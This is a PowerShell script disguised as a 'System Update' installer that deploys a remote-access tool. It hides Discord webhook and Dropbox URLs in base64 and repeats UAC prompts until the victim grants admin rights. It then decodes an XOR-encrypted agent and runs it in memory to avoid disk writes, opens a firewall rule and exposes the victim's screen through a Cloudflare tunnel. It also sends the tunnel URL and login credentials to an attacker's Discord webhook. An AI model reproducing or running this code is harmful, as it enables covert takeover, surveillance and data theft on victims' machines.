$d={[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($args[0]))}
$LW=& $d 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMTIxNTg5MDQ0MjYyMDk5OC9MejhYZloyOGFGMFhhVWI2dTBSWU9QTkdFYlIzbnRTX05NOVM1LThXTDJBUlh3OHVyX3R2T1NIaFF5LU9uX1F1bFVueg=='
$DW=& $d 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMDYxNzYwNjM2MzU0NTcwMC9PYWt6VWJzQURvQUg0TmtubUhTSi1ibTJjSzRmZ3c5cE56Q3M5WW1ZTlVZMHhaR21tSVJfZEEzWjhReFVJUjhnNVFCQg=='
$DU=& $d 'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL3FxMzRvOWl0NHJnYWxlamM3eWczaS9kYXRhLnppcD9ybGtleT1hOTlvYWtrMDV5Z3A2aW1iYjRteWllbDdoJnN0PWRoa3Q4b2YyJmRsPTE='
# Auto-elevate to admin (UAC)
$LogWebhook = "$LW"

function Send-Log($msg) {
    try {
        $body = @{ content = "[sysupdate] $msg" } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $LogWebhook -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
    } catch {}
}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptPath = $PSCommandPath
    if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
    if (-not $scriptPath) { $scriptPath = Join-Path $PSScriptRoot "sysupdate.ps1" }
    Send-Log "Not admin. scriptPath=$scriptPath PSCommandPath=$PSCommandPath PSScriptRoot=$PSScriptRoot"

    try {
        Add-Type -TypeDefinition ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('')))
        $hwnd = [Win32]::GetConsoleWindow()
        Send-Log "ConsoleWindow handle=$hwnd"
        if ($hwnd -eq [IntPtr]::Zero) {
            [Win32]::AllocConsole() | Out-Null
            $hwnd = [Win32]::GetConsoleWindow()
            Send-Log "AllocConsole done, new handle=$hwnd"
        }
    } catch {
        Send-Log "Win32 init error: $($_.Exception.Message)"
    }

    while ($true) {
        try {
            Send-Log "Attempting Start-Process RunAs..."
            $proc = Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs -Wait -PassThru -WindowStyle Hidden
            Send-Log "Elevated instance exited with code $($proc.ExitCode)"
            exit $proc.ExitCode
        } catch {
            $errMsg = $_.Exception.Message
            Send-Log "UAC elevation failed: $errMsg"
            Write-Host "  Admin elevation required. Please accept the UAC prompt."
            Start-Sleep -Milliseconds 1000
        }
    }
}

$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$DiscordWebhook = "$DW"
$DownloadUrl = "$DU"
$WorkDir = Join-Path $env:TEMP "SysUpd"
$ServerDir = Join-Path $WorkDir "Server"
$ToolsDir = Join-Path $WorkDir ".tools"

# Bun versions to try (newest first, fallback if CPU incompatible)
# Always use "baseline" builds first — they don't require AVX2/AVX-512
$BunVersions = @(
    @{ tag = "bun-v1.2.23"; zip = "bun-windows-x64-baseline.zip" },
    @{ tag = "bun-v1.2.23"; zip = "bun-windows-x64.zip" },
    @{ tag = "bun-v1.1.30"; zip = "bun-windows-x64-baseline.zip" },
    @{ tag = "bun-v1.1.30"; zip = "bun-windows-x64.zip" }
)

# Look for agent.exe.enc in script dir first, then WorkDir (resolved after extraction)
$ScriptDir = if ($PSCommandPath) { Split-Path $PSCommandPath } elseif ($PSScriptRoot) { $PSScriptRoot } else { "" }
$AgentEnc = $null

function Get-FileWithRetry {
    param([string]$Uri, [string]$OutFile, [int]$MaxRetries = 2)
    for ($attempt = 0; $attempt -le $MaxRetries; $attempt++) {
        if ($attempt -gt 0) {
            Write-Host "  Retry $attempt/$MaxRetries..." -ForegroundColor Yellow
            Start-Sleep -Seconds 2
        }
        try {
            & curl.exe -L -f -o $OutFile $Uri --max-time 300 --retry 2 2>$null
            if ($LASTEXITCODE -eq 0 -and (Test-Path $OutFile) -and (Get-Item $OutFile).Length -gt 1024) {
                return $true
            }
        } catch {}
    }
    return $false
}

Write-Host ""
Write-Host "=========================================================="
Write-Host "  System Update - Setting up..."
Write-Host "=========================================================="
Write-Host ""

# ============================================================
#  Step 1: Download and extract files
# ============================================================
$needsExtraction = $false
if (-not (Test-Path $ServerDir)) {
    $needsExtraction = $true
} elseif (-not (Test-Path "$ServerDir\package.json") -or -not (Test-Path "$ServerDir\src")) {
    Write-Host "[!] Incomplete extraction detected, re-extracting..."
    $prevEAP = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"
    taskkill /F /IM bun.exe
    taskkill /F /IM node.exe
    $ErrorActionPreference = $prevEAP
    Start-Sleep -Seconds 2
    Remove-Item $ServerDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $WorkDir "Client") -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $WorkDir "Overlord-Server") -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $WorkDir "Overlord-Client") -Recurse -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
    $needsExtraction = $true
}

New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
New-Item -ItemType Directory -Path $ToolsDir -Force | Out-Null

# ============================================================
#  Parallel downloads (data.zip + bun + cloudflared via curl)
# ============================================================
$zipPath = Join-Path $env:TEMP "sysupdate-cache.zip"
$bunDir = Join-Path $ToolsDir "bun"
$bunZip = Join-Path $env:TEMP "bun-win.zip"
$cfPath = Join-Path $ToolsDir "cloudflared.exe"

$needZip = $needsExtraction -and -not (Test-Path $zipPath)
$needBun = $false
if (-not (Get-Command bun -ErrorAction SilentlyContinue)) {
    if (-not (Test-Path "$bunDir\bun.exe") -and -not (Test-Path "$env:USERPROFILE\.bun\bin\bun.exe")) {
        $needBun = $true
    }
}
$needCf = (-not (Get-Command cloudflared -ErrorAction SilentlyContinue)) -and -not (Test-Path $cfPath) -and -not (Test-Path "$WorkDir\cloudflared.exe")

$hasAny = $needZip -or $needBun -or $needCf

Write-Host "[1/6] Downloading..."

if ($hasAny) {
    $curlArgs = @()
    if ($needZip) { $curlArgs += @("--parallel", "--parallel-max", "3", "-L", "-f", "-o", $zipPath, $DownloadUrl, "--max-time", "300", "--retry", "2") }
    if ($needBun) { if ($needZip) { $curlArgs += "--next" }; $curlArgs += @("-L", "-f", "-o", $bunZip, "https://github.com/oven-sh/bun/releases/download/$($BunVersions[0].tag)/$($BunVersions[0].zip)", "--max-time", "300", "--retry", "2") }
    if ($needCf) { if ($needZip -or $needBun) { $curlArgs += "--next" }; $curlArgs += @("-L", "-f", "-o", $cfPath, "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe", "--max-time", "300", "--retry", "2") }

    if (-not $needZip) { $curlArgs = @($curlArgs | Where-Object { $_ -ne "--parallel" -and $_ -ne "--parallel-max" -and $_ -ne "3" }) }

    $dlSw = [System.Diagnostics.Stopwatch]::StartNew()
    $prevEAP = $ErrorActionPreference
    $ErrorActionPreference = "Continue"
    & curl.exe @curlArgs 2>$null
    $ErrorActionPreference = $prevEAP
    $dlSw.Stop()

    if ($LASTEXITCODE -ne 0) {
        Write-Host "[error] One or more downloads failed (curl exit $LASTEXITCODE)." -ForegroundColor Red
        exit 1
    }

    $totalMB = 0
    if ($needZip -and (Test-Path $zipPath)) { $totalMB += (Get-Item $zipPath).Length / 1MB }
    if ($needBun -and (Test-Path $bunZip)) { $totalMB += (Get-Item $bunZip).Length / 1MB }
    if ($needCf -and (Test-Path $cfPath)) { $totalMB += (Get-Item $cfPath).Length / 1MB }
    Write-Host "  Downloaded: $([math]::Round($totalMB, 1)) MB in $($dlSw.Elapsed.TotalSeconds.ToString('F1'))s ($([math]::Round($totalMB / [Math]::Max(0.1, $dlSw.Elapsed.TotalSeconds), 1)) MB/s)"
} else {
    Write-Host "  All files present, skipping."
}

# ============================================================
#  Step 2: Extract data.zip
# ============================================================
if ($needsExtraction) {
    if (-not (Test-Path $zipPath)) {
        Write-Host "[error] data.zip not found after download!" -ForegroundColor Red
        exit 1
    }
    Write-Host "[2/6] Extracting..."
    Expand-Archive -Path $zipPath -DestinationPath $WorkDir -Force
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

    $nested = Join-Path $WorkDir "data"
    if (Test-Path $nested) {
        Get-ChildItem $nested | Move-Item -Destination $WorkDir -Force
        Remove-Item $nested -Force -ErrorAction SilentlyContinue
    }

    $extractedSvr = Join-Path $WorkDir "Overlord-Server"
    $extractedCli = Join-Path $WorkDir "Overlord-Client"
    if (Test-Path $extractedSvr) {
        if (Test-Path $ServerDir) { Remove-Item $ServerDir -Recurse -Force; Start-Sleep -Milliseconds 500 }
        if (Test-Path $ServerDir) { Remove-Item $ServerDir -Recurse -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 1 }
        if (-not (Test-Path $ServerDir)) {
            Rename-Item $extractedSvr $ServerDir -Force
        } else {
            Get-ChildItem $extractedSvr | Move-Item -Destination $ServerDir -Force
            Remove-Item $extractedSvr -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    if (Test-Path $extractedCli) {
        $clientDir = Join-Path $WorkDir "Client"
        if (Test-Path $clientDir) { Remove-Item $clientDir -Recurse -Force; Start-Sleep -Milliseconds 500 }
        if (-not (Test-Path $clientDir)) {
            Rename-Item $extractedCli $clientDir -Force
        } else {
            Get-ChildItem $extractedCli | Move-Item -Destination $clientDir -Force
            Remove-Item $extractedCli -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    Write-Host "  Extracted."
} else {
    Write-Host "[2/6] Already extracted, skipping..."
}

# Resolve agent.exe.enc now that extraction is done
$encCandidates = @(
    (Join-Path $ScriptDir "agent.exe.enc"),
    (Join-Path $ScriptDir "bin\agent.exe.enc"),
    (Join-Path $WorkDir "Client\agent.exe.enc"),
    (Join-Path $WorkDir "Overlord-Client\agent.exe.enc")
)
foreach ($c in $encCandidates) {
    if (Test-Path $c) { $AgentEnc = $c; break }
}

# ============================================================
#  Step 3: Install bun (with version fallback for CPU compat)
# ============================================================
function Test-BunBinary {
    param([string]$Path)
    if (-not (Test-Path $Path)) { return $false }
    if ((Get-Item $Path).Length -lt 1MB) { return $false }
    $prevEAP = $ErrorActionPreference
    $ErrorActionPreference = "Continue"
    & $Path --version 2>$null | Out-Null
    $ok = $LASTEXITCODE -eq 0
    $ErrorActionPreference = $prevEAP
    return $ok
}

function Find-Bun {
    $cmd = Get-Command bun -ErrorAction SilentlyContinue
    if ($cmd -and (Test-BunBinary $cmd.Source)) { return $cmd.Source }
    $candidates = @(
        "$env:USERPROFILE\.bun\bin\bun.exe",
        "$env:LOCALAPPDATA\bun\bun.exe",
        "$ToolsDir\bun\bun.exe"
    )
    foreach ($c in $candidates) {
        if (Test-BunBinary $c) { return $c }
    }
    return $null
}

$bunPath = Find-Bun
if (-not $bunPath) {
    Write-Host "[3/6] Installing bun..."
    $bunInstalled = $false
    foreach ($ver in $BunVersions) {
        $tag = $ver.tag
        $zipName = $ver.zip
        $url = "https://github.com/oven-sh/bun/releases/download/$tag/$zipName"
        Write-Host "  Trying $tag..."

        $prevEAP = $ErrorActionPreference
        $ErrorActionPreference = "Continue"
        & curl.exe -L -f -o $bunZip $url --max-time 300 --retry 1 2>$null
        $dlOk = $LASTEXITCODE -eq 0
        $ErrorActionPreference = $prevEAP

        if (-not $dlOk -or -not (Test-Path $bunZip) -or (Get-Item $bunZip).Length -lt 1MB) {
            Write-Host "  $tag download failed, trying next..." -ForegroundColor Yellow
            Remove-Item $bunZip -Force -ErrorAction SilentlyContinue
            continue
        }

        New-Item -ItemType Directory -Path $bunDir -Force | Out-Null
        Expand-Archive -Path $bunZip -DestinationPath $bunDir -Force
        $subDir = Join-Path $bunDir "bun-windows-x64"
        $subDirBaseline = Join-Path $bunDir "bun-windows-x64-baseline"
        if (Test-Path $subDir) {
            Get-ChildItem $subDir | Move-Item -Destination $bunDir -Force
            Remove-Item $subDir -Recurse -Force -ErrorAction SilentlyContinue
        }
        if (Test-Path $subDirBaseline) {
            Get-ChildItem $subDirBaseline | Move-Item -Destination $bunDir -Force
            Remove-Item $subDirBaseline -Recurse -Force -ErrorAction SilentlyContinue
        }
        Remove-Item $bunZip -Force -ErrorAction SilentlyContinue

        $testPath = Join-Path $bunDir "bun.exe"
        if (Test-BunBinary $testPath) {
            $bunPath = $testPath
            Write-Host "  $tag works!"
            $bunInstalled = $true
            break
        } else {
            Write-Host "  $tag crashed, trying next..." -ForegroundColor Yellow
            Remove-Item $bunDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    if (-not $bunInstalled) {
        # Check if a pre-compiled server exe exists — bun not needed
        $prebuiltExe = $null
        foreach ($c in @(
            (Join-Path $ServerDir "dist\overlord-server.exe"),
            (Join-Path $ServerDir "overlord-server.exe"),
            (Join-Path $WorkDir "overlord-server.exe"),
            (Join-Path $ToolsDir "overlord-server.exe")
        )) {
            if (Test-Path $c) { $prebuiltExe = $c; break }
        }
        if ($prebuiltExe) {
            Write-Host "  Bun not available, using pre-compiled server."
            $bunPath = $null
        } else {
            Write-Host ""
            Write-Host "[error] All bun versions failed (CPU may not support required instructions)." -ForegroundColor Red
            Write-Host "  Pre-compile the server on a working machine:" -ForegroundColor Yellow
            Write-Host "    cd Overlord-Server && bun run build:prod:win" -ForegroundColor Yellow
            Write-Host "  Upload dist/overlord-server.exe into the Dropbox Server/ dir and re-zip." -ForegroundColor Yellow
            exit 1
        }
    }
} else {
    Write-Host "[3/6] bun found."
}
if ($bunPath) { $bunDir = Split-Path $bunPath; $env:PATH = "$bunDir;$env:PATH" }

# ============================================================
#  Step 4: Verify cloudflared
# ============================================================
function Find-Cloudflared {
    $cmd = Get-Command cloudflared -ErrorAction SilentlyContinue
    if ($cmd) { return $cmd.Source }
    $candidates = @(
        "$WorkDir\cloudflared.exe",
        "$ToolsDir\cloudflared.exe",
        "$env:USERPROFILE\cloudflared.exe"
    )
    foreach ($c in $candidates) {
        if (Test-Path $c) { return $c }
    }
    return $null
}

$cfPath = Find-Cloudflared
if (-not $cfPath) {
    Write-Host "[error] cloudflared.exe not found after download!" -ForegroundColor Red
    exit 1
} else {
    Write-Host "[4/6] Tunnel ready."
}

# ============================================================
#  Step 4: Clean up old processes and DB
# ============================================================
Write-Host "[5/6] Cleaning up..."
Get-Process bun -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Get-Process cloudflared -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Get-Process agent -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

$portInUse = Get-NetTCPConnection -LocalPort 5173 -ErrorAction SilentlyContinue
if ($portInUse) {
    $portInUse | Select-Object -ExpandProperty OwningProcess -Unique | ForEach-Object {
        Stop-Process -Id $_ -Force -ErrorAction SilentlyContinue
    }
    Start-Sleep -Seconds 2
}

$dataDir = Join-Path $env:APPDATA "Overlord"
$dbFile = Join-Path $dataDir "overlord.db"
$saveFile = Join-Path $dataDir "save.json"
Remove-Item $dbFile -Force -ErrorAction SilentlyContinue
Remove-Item "$dbFile-wal" -Force -ErrorAction SilentlyContinue
Remove-Item "$dbFile-shm" -Force -ErrorAction SilentlyContinue
Remove-Item $saveFile -Force -ErrorAction SilentlyContinue

# ============================================================
#  Step 5: Compile in-memory PE loader
# ============================================================
Write-Host "[6/6] Compiling loader..."
Add-Type -TypeDefinition ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(''))) -Language CSharp -ErrorAction Stop
Write-Host "  Compiled OK."

# ============================================================
#  Step 6: Generate password and start server
# ============================================================
$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
$Password = -join (1..24 | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })

Write-Host ""
Write-Host "=========================================================="
Write-Host "  Instance Ready"
Write-Host "=========================================================="
Write-Host "  Username : admin"
Write-Host "  Password : $Password"
Write-Host "=========================================================="
Write-Host ""
Write-Host "  Starting services..."
Write-Host ""

$serverEnv = @{
    "HOST" = "0.0.0.0"
    "PORT" = "5173"
    "OVERLORD_TLS_OFFLOAD" = "true"
    "OVERLORD_TRUST_PROXY" = "true"
    "OVERLORD_PASS" = $Password
    "OVERLORD_USER" = "admin"
    "OVERLORD_HEALTHCHECK_URL" = "http://127.0.0.1:5173/health"
    "LOG_LEVEL" = "info"
    "NODE_ENV" = "development"
    "OVERLORD_DISABLE_AGENT_AUTH" = "true"
    "OVERLORD_ENROLLMENT_REQUIRE_APPROVAL" = "false"
}
foreach ($kv in $serverEnv.GetEnumerator()) { [Environment]::SetEnvironmentVariable($kv.Key, $kv.Value, "Process") }
if ($bunDir) { $env:PATH = "$bunDir;$env:PATH" }

# Check for pre-compiled server exe first
$serverExe = $null
$candidates = @(
    (Join-Path $ServerDir "dist\overlord-server.exe"),
    (Join-Path $ServerDir "overlord-server.exe"),
    (Join-Path $WorkDir "overlord-server.exe"),
    (Join-Path $ToolsDir "overlord-server.exe")
)
foreach ($c in $candidates) {
    if (Test-Path $c) { $serverExe = $c; break }
}

# Allow bun through firewall silently (prevents popup)
try {
    $fwRule = "SysUpd-Bun"
    netsh advfirewall firewall add rule name="$fwRule" dir=in action=allow program="$bunPath" enable=yes profile=any 2>$null | Out-Null
} catch {}

if ($serverExe) {
    Write-Host "[core] Using pre-compiled server: $serverExe"
    Write-Host "[core] Starting backend..."
    $serverProc = Start-Process -FilePath $serverExe -NoNewWindow -PassThru -RedirectStandardError "$env:TEMP\svc-core.log"
} else {
    Write-Host "[core] Installing dependencies..."
    $installProc = Start-Process -FilePath $bunPath -ArgumentList "install" -WorkingDirectory $ServerDir -NoNewWindow -Wait -PassThru -RedirectStandardOutput "$env:TEMP\svc-install.log" -RedirectStandardError "$env:TEMP\svc-install-err.log"
    if ($installProc.ExitCode -ne 0) {
        Write-Host "[error] Dependency install failed (exit $($installProc.ExitCode))." -ForegroundColor Red
        Get-Content "$env:TEMP\svc-install-err.log" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "  $_" -ForegroundColor DarkRed }
        Get-Content "$env:TEMP\svc-install.log" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "  $_" }
        exit 1
    }
    Write-Host "  Dependencies installed."

    Write-Host "[core] Starting backend..."
    $serverProc = Start-Process -FilePath $bunPath -ArgumentList "run","dev" -WorkingDirectory $ServerDir -NoNewWindow -PassThru -RedirectStandardError "$env:TEMP\svc-core.log"
}

Write-Host "[core] Waiting for backend..."
$ready = $false
for ($i = 1; $i -le 30; $i++) {
    Start-Sleep -Seconds 2
    try {
        $response = Invoke-WebRequest -Uri "http://127.0.0.1:5173/health" -UseBasicParsing -TimeoutSec 2 -ErrorAction Stop
        if ($response.StatusCode -eq 200) { $ready = $true; break }
    } catch {}
    Write-Host "[core] Still waiting... ($i/30)"
}
if (-not $ready) {
    Write-Host "[error] Backend failed to start." -ForegroundColor Red
    Get-Content "$env:TEMP\svc-core.log" -ErrorAction SilentlyContinue
    Stop-Process -Id $serverProc.Id -Force -ErrorAction SilentlyContinue
    exit 1
}
Write-Host "[core] Ready!"

try {
    $body = @{ user = "admin"; pass = $Password } | ConvertTo-Json
    $loginResult = Invoke-WebRequest -Uri "http://127.0.0.1:5173/api/login" -Method POST -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 5
    $loginData = $loginResult.Content | ConvertFrom-Json
    if ($loginData.ok) { Write-Host "[auth] Login OK!" }
} catch {
    Write-Host "[auth] WARNING: Login check failed: $_" -ForegroundColor Yellow
}

# ============================================================
#  Start agent from memory (no disk write!)
# ============================================================
Write-Host "[agent] Loading agent..."
if (Test-Path $AgentEnc) {
    $env:OVERLORD_SERVER = "ws://127.0.0.1:5173"
    $env:OVERLORD_TLS_INSECURE_SKIP_VERIFY = "true"
    $env:OVERLORD_MODE = "development"

    $b64 = [System.IO.File]::ReadAllText($AgentEnc)
    $peBytes = [Convert]::FromBase64String($b64)
    $key = 0x5A
    for ($i = 0; $i -lt $peBytes.Length; $i++) { $peBytes[$i] = $peBytes[$i] -bxor $key }
    Write-Host "  Decoded: $([math]::Round($peBytes.Length / 1MB, 1)) MB"

    [MemPELoader]::PE = $peBytes
    [MemPELoader]::LoadAndRun()
    Write-Host "[agent] Running in-memory!"
} else {
    Write-Host "  WARNING: agent not found!" -ForegroundColor Yellow
}

# ============================================================
#  Start tunnel
# ============================================================
Write-Host ""
Write-Host "[tunnel] Starting tunnel..."
$tunnelUrl = ""
$cfProcess = Start-Process -FilePath $cfPath -ArgumentList "tunnel","--url","http://localhost:5173" -NoNewWindow -PassThru -RedirectStandardError "$env:TEMP\svc-tunnel.log"

for ($i = 0; $i -lt 30; $i++) {
    Start-Sleep -Seconds 1
    if (Test-Path "$env:TEMP\svc-tunnel.log") {
        $logContent = Get-Content "$env:TEMP\svc-tunnel.log" -ErrorAction SilentlyContinue
        foreach ($line in $logContent) {
            if ($line -match 'https://[a-zA-Z0-9-]+\.trycloudflare\.com') {
                $tunnelUrl = $Matches[0]
                break
            }
        }
    }
    if ($tunnelUrl) { break }
}

if ($tunnelUrl) {
    Write-Host ""
    Write-Host "=========================================================="
    Write-Host "  SERVICE IS LIVE!"
    Write-Host "=========================================================="
    Write-Host ""
    Write-Host "  URL      : $tunnelUrl"
    Write-Host "  Username : admin"
    Write-Host "  Password : $Password"
    Write-Host ""
    Write-Host "=========================================================="

    try {
        $msg = "**Service Instance is LIVE**" + "`n`n" +
               "**URL:** $tunnelUrl" + "`n" +
               "**Username:** admin" + "`n" +
               "**Password:** $Password" + "`n`n" +
               "Open the URL in a browser to view the screen."
        $body = @{ content = $msg } | ConvertTo-Json -Compress
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType "application/json" -Body $bytes
        Write-Host "[notify] Details sent!"
    } catch {
        Write-Host "[notify] Failed to send: $($_.Exception.Message)" -ForegroundColor Yellow
    }
} else {
    Write-Host "[warning] Could not detect tunnel URL." -ForegroundColor Yellow
}

try {
    $cfProcess.WaitForExit()
} finally {
    Write-Host "[shutdown] Stopping..."
    Stop-Process -Id $cfProcess.Id -Force -ErrorAction SilentlyContinue
    Stop-Process -Id $serverProc.Id -Force -ErrorAction SilentlyContinue
    Get-Process bun -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Write-Host "[shutdown] Done."
}
